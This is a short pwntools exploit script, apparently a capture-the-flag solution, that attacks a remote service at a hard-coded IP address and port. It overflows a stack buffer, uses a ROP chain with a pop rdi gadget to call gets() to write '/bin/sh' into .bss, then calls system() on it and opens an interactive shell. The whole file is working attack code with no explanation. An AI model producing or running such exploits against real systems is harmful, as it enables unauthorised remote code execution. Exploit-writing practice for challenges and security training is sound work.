from pwn import *
context(arch='amd64',os='linux')

# p = process('./pwn')
p = remote('124.156.121.112',28062)
elf = ELF('./pwn',checksec=False)

system_plt = elf.sym['system']
gets_plt = elf.sym['gets']
pop_rdi = 0x0000000000400733 
bss = 0x601078 

payload = 'A'*(0x2a0+8)
payload += flat([pop_rdi, bss, gets_plt, 0x0000000000400661])
p.sendline(payload)
p.sendline('/bin/sh\x00')

payload = 'A'*(0x2a0 + 8)
payload += flat([pop_rdi, bss, system_plt, 0x0000000000400661])
p.sendline(payload)
sleep(0.1)
p.interactive()
